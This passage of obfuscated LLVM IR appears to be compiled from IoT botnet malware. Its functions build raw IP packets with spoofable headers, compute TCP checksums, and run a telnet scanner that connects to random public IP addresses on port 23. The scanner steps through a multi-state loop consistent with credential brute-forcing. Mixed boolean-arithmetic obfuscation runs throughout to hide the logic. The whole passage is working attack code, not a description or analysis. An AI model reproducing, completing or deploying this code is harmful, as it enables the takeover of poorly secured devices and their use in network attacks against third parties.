  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 -7, -1
  %21 = and i8 %18, -7
  %22 = and i8 %16, %20
  %23 = and i8 %19, -7
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 -7, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 15, -1
  %38 = xor i8 %36, %37
  %39 = and i8 %38, %36
  %40 = and i8 %36, 15
  %41 = xor i8 %39, -1
  %42 = xor i8 64, -1
  %43 = xor i8 -38, -1
  %44 = and i8 %41, -38
  %45 = and i8 %39, %43
  %46 = and i8 %42, -38
  %47 = and i8 64, %43
  %48 = or i8 %44, %45
  %49 = or i8 %46, %47
  %50 = xor i8 %48, %49
  %51 = or i8 %41, %42
  %52 = xor i8 %51, -1
  %53 = or i8 -38, %43
  %54 = and i8 %52, %53
  %55 = or i8 %50, %54
  %56 = or i8 %39, 64
  store i8 %55, i8* %35, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 1
  store i8 0, i8* %58, align 1
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = sub i64 20, %61
  %63 = add i64 20, %60
  %64 = trunc i64 %62 to i16
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 2
  store i16 %64, i16* %66, align 2
  %67 = call i32 @rand_cmwc()
  %68 = trunc i32 %67 to i16
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 3
  store i16 %68, i16* %70, align 4
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 4
  store i16 0, i16* %72, align 2
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 5
  store i8 -1, i8* %74, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 6
  store i8 %75, i8* %77, align 1
  %78 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %79 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %78, i32 0, i32 7
  store i16 0, i16* %79, align 2
  %80 = load i32, i32* %8, align 4
  %81 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %82 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %81, i32 0, i32 8
  store i32 %80, i32* %82, align 4
  %83 = load i32, i32* %7, align 4
  %84 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %85 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %84, i32 0, i32 9
  store i32 %83, i32* %85, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, -1
  %27 = and i32 39788972, %26
  %28 = xor i32 39788972, -1
  %29 = and i32 %24, %28
  %30 = xor i32 %25, -1
  %31 = and i32 %30, 39788972
  %32 = and i32 %25, %28
  %33 = or i32 %27, %29
  %34 = or i32 %31, %32
  %35 = xor i32 %33, %34
  %36 = xor i32 %24, %25
  call void @srand(i32 %35) #2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 23) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %40, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 8, i32 4, i1 false)
  %42 = call noalias i8* @malloc(i64 1025) #2
  store i8* %42, i8** %17, align 8
  %43 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 1025, i32 1, i1 false)
  %44 = load i32, i32* %11, align 4
  %45 = zext i32 %44 to i64
  %46 = call i8* @llvm.stacksave()
  store i8* %46, i8** %19, align 8
  %47 = alloca %struct.telstate_t, i64 %45, align 16
  %48 = bitcast %struct.telstate_t* %47 to i8*
  %49 = load i32, i32* %11, align 4
  %50 = sext i32 %49 to i64
  %51 = mul i64 %50, 5
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 %51, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %52

; <label>:52:                                     ; preds = %70, %2
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %11, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %58
  %60 = bitcast %struct.telstate_t* %59 to i8*
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 32, i32 16, i1 false)
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %62
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %63, i32 0, i32 3
  store i8 1, i8* %64, align 1
  %65 = load i8*, i8** %17, align 8
  %66 = load i32, i32* %5, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %67
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %68, i32 0, i32 9
  store i8* %65, i8** %69, align 8
  br label %70

; <label>:70:                                     ; preds = %56
  %71 = load i32, i32* %5, align 4
  %72 = sub i32 %71, 23516472
  %73 = add i32 %72, 1
  %74 = add i32 %73, 23516472
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %5, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  store i32 0, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %87, %76
  %78 = load i32, i32* %7, align 4
  %79 = sub i32 %78, 2069171172
  %80 = add i32 %79, 1
  %81 = add i32 %80, 2069171172
  %82 = add nsw i32 %78, 1
  store i32 %81, i32* %7, align 4
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %83
  %85 = load i8*, i8** %84, align 8
  %86 = icmp ne i8* %85, null
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %77
  br label %77

; <label>:88:                                     ; preds = %77
  br label %89

; <label>:89:                                     ; preds = %823, %88
  br label %90

; <label>:90:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %91

; <label>:91:                                     ; preds = %817, %90
  %92 = load i32, i32* %5, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %823

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 7
  %100 = load i32, i32* %99, align 16
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %108

; <label>:102:                                    ; preds = %95
  %103 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %104 = load i32, i32* %5, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 7
  store i32 %103, i32* %107, align 16
  br label %108

; <label>:108:                                    ; preds = %102, %95
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = zext i8 %113 to i32
  switch i32 %114, label %816 [
    i32 0, label %115
    i32 1, label %274
    i32 2, label %400
    i32 3, label %448
    i32 4, label %493
    i32 5, label %541
    i32 6, label %586
    i32 7, label %687
  ]

; <label>:115:                                    ; preds = %108
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 3
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 1
  br i1 %122, label %123, label %143

; <label>:123:                                    ; preds = %115
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 9
  %128 = load i8*, i8** %127, align 8
  store i8* %128, i8** %20, align 8
  %129 = load i32, i32* %5, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %130
  %132 = bitcast %struct.telstate_t* %131 to i8*
  call void @llvm.memset.p0i8.i64(i8* %132, i8 0, i64 32, i32 16, i1 false)
  %133 = load i8*, i8** %20, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 9
  store i8* %133, i8** %137, align 8
  %138 = call i32 @GetRandomPublicIP()
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 1
  store i32 %138, i32* %142, align 4
  br label %199

; <label>:143:                                    ; preds = %115
  %144 = load i32, i32* %5, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 3
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %151, label %198

; <label>:151:                                    ; preds = %143
  %152 = load i32, i32* %5, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 5
  %156 = load i8, i8* %155, align 1
  %157 = sub i8 0, %156
  %158 = sub i8 0, 1
  %159 = add i8 %157, %158
  %160 = sub i8 0, %159
  %161 = add i8 %156, 1
  store i8 %160, i8* %155, align 1
  %162 = load i32, i32* %5, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 4
  %166 = load i8, i8* %165, align 2
  %167 = sub i8 0, %166
  %168 = sub i8 0, 1
  %169 = add i8 %167, %168
  %170 = sub i8 0, %169
  %171 = add i8 %166, 1
  store i8 %170, i8* %165, align 2
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i64
  %178 = icmp eq i64 %177, 20
  br i1 %178, label %179, label %184

; <label>:179:                                    ; preds = %151
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 3
  store i8 1, i8* %183, align 1
  br label %817

; <label>:184:                                    ; preds = %151
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 4
  %189 = load i8, i8* %188, align 2
  %190 = zext i8 %189 to i64
  %191 = icmp eq i64 %190, 20
  br i1 %191, label %192, label %197

; <label>:192:                                    ; preds = %184
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 3
  store i8 1, i8* %196, align 1
  br label %817

; <label>:197:                                    ; preds = %184
  br label %198

; <label>:198:                                    ; preds = %197, %143
  br label %199

; <label>:199:                                    ; preds = %198, %123
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %200, align 4
  %201 = call zeroext i16 @htons(i16 zeroext 23) #13
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %201, i16* %202, align 2
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %204 = getelementptr inbounds [8 x i8], [8 x i8]* %203, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %204, i8 0, i64 8, i32 4, i1 false)
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %211 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %210, i32 0, i32 0
  store i32 %209, i32* %211, align 4
  %212 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  store i32 %212, i32* %216, align 16
  %217 = load i32, i32* %5, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %199
  br label %817

; <label>:224:                                    ; preds = %199
  %225 = load i32, i32* %5, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 16
  %230 = load i32, i32* %5, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 16
  %235 = call i32 (i32, i32, ...) @fcntl(i32 %234, i32 3, i8* null)
  %236 = xor i32 %235, -1
  %237 = xor i32 2048, -1
  %238 = xor i32 -170912248, -1
  %239 = and i32 %236, -170912248
  %240 = and i32 %235, %238
  %241 = and i32 %237, -170912248
  %242 = and i32 2048, %238
  %243 = or i32 %239, %240
  %244 = or i32 %241, %242
  %245 = xor i32 %243, %244
  %246 = or i32 %236, %237
  %247 = xor i32 %246, -1
  %248 = or i32 -170912248, %238
  %249 = and i32 %247, %248
  %250 = or i32 %245, %249
  %251 = or i32 %235, 2048
  %252 = call i32 (i32, i32, ...) @fcntl(i32 %229, i32 4, i32 %250)
  %253 = load i32, i32* %5, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %254
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 16
  %258 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %259 = call i32 @connect(i32 %257, %struct.sockaddr* %258, i32 16)
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %261, label %269

; <label>:261:                                    ; preds = %224
  %262 = call i32* @__errno_location() #13
  %263 = load i32, i32* %262, align 4
  %264 = icmp ne i32 %263, 115
  br i1 %264, label %265, label %269

; <label>:265:                                    ; preds = %261
  %266 = load i32, i32* %5, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %267
  call void @reset_telstate(%struct.telstate_t* %268)
  br label %273

; <label>:269:                                    ; preds = %261, %224
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %271
  call void @advance_state(%struct.telstate_t* %272, i32 1)
  br label %273

; <label>:273:                                    ; preds = %269, %265
  br label %816

; <label>:274:                                    ; preds = %108
  br label %275

; <label>:275:                                    ; preds = %274
  %276 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %277 = getelementptr inbounds [16 x i64], [16 x i64]* %276, i64 0, i64 0
  %278 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %277) #2, !srcloc !6
  %279 = extractvalue { i64, i64* } %278, 0
  %280 = extractvalue { i64, i64* } %278, 1
  %281 = trunc i64 %279 to i32
  store i32 %281, i32* %21, align 4
  %282 = ptrtoint i64* %280 to i64
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %22, align 4
  br label %284

; <label>:284:                                    ; preds = %275
  br label %285

; <label>:285:                                    ; preds = %284
  %286 = load i32, i32* %5, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %287
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %288, i32 0, i32 0
  %290 = load i32, i32* %289, align 16
  %291 = srem i32 %290, 64
  %292 = zext i32 %291 to i64
  %293 = shl i64 1, %292
  %294 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %295 = load i32, i32* %5, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = sdiv i32 %299, 64
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds [16 x i64], [16 x i64]* %294, i64 0, i64 %301
  %303 = load i64, i64* %302, align 8
  %304 = xor i64 %303, -1
  %305 = xor i64 %293, -1
  %306 = xor i64 -7919097357640492658, -1
  %307 = and i64 %304, -7919097357640492658
  %308 = and i64 %303, %306
  %309 = and i64 %305, -7919097357640492658
  %310 = and i64 %293, %306
  %311 = or i64 %307, %308
  %312 = or i64 %309, %310
  %313 = xor i64 %311, %312
  %314 = or i64 %304, %305
  %315 = xor i64 %314, -1
  %316 = or i64 -7919097357640492658, %306
  %317 = and i64 %315, %316
  %318 = or i64 %313, %317
  %319 = or i64 %303, %293
  store i64 %318, i64* %302, align 8
  %320 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %320, align 8
  %321 = load i32, i32* %3, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %322, i64* %323, align 8
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = add i32 %328, 59483298
  %330 = add i32 %329, 1
  %331 = sub i32 %330, 59483298
  %332 = add nsw i32 %328, 1
  %333 = call i32 @select(i32 %331, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %333, i32* %6, align 4
  %334 = load i32, i32* %6, align 4
  %335 = icmp eq i32 %334, 1
  br i1 %335, label %336, label %375

; <label>:336:                                    ; preds = %285
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %337 = load i32, i32* %5, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = bitcast i32* %15 to i8*
  %343 = call i32 @getsockopt(i32 %341, i32 1, i32 4, i8* %342, i32* %14) #2
  %344 = load i32, i32* %15, align 4
  %345 = icmp ne i32 %344, 0
  br i1 %345, label %346, label %350

; <label>:346:                                    ; preds = %336
  %347 = load i32, i32* %5, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %348
  call void @reset_telstate(%struct.telstate_t* %349)
  br label %374

; <label>:350:                                    ; preds = %336
  %351 = load i32, i32* %5, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 0
  %355 = load i32, i32* %354, align 16
  %356 = load i32, i32* %5, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = call i32 (i32, i32, ...) @fcntl(i32 %360, i32 3, i8* null)
  %362 = xor i32 %361, -1
